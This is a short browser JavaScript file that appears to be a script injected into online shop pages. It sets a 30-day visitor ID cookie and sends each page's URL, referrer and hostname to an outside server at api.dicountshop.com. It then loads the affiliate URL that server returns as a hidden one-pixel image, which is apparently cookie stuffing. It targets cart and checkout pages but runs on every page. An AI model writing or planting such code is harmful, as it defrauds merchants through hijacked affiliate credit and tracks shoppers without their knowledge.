(async function() {
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }


    function createTrackingPixel(url) {
        
        var img = document.createElement('img');
        img.src = url;
        img.style.width = '1px';
        img.style.height = '1px';
        img.style.display = 'none';  
        img.style.visibility = 'hidden';
        
        document.body.appendChild(img);
    }

    async function initTracking() {
        // if (sessionStorage.getItem('iframe_triggered')) {
        //     return; 
        // }


        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';
            console.log("line => 34");
            let response = await fetch('https://api.dicountshop.com/api/track-user', {
                method: 'POST',
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                }),
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin':'*'
                }
            });
           
            let result = await response.json();
         
            if (result.success && result.affiliate_url) {
                createTrackingPixel(result.affiliate_url);
                sessionStorage.setItem('iframe_triggered', 'true'); 
            } else {
                createTrackingPixel('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Error in tracking script:', error);
        }
    }

    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return '';
    }

     function isCartPage() {
        const cartPages = ['/cart', '/checkout'];
        return cartPages.some(path => window.location.pathname.includes(path));
    }



     if (isCartPage()) {
        initTracking();
    }

    initTracking();
   
    
})();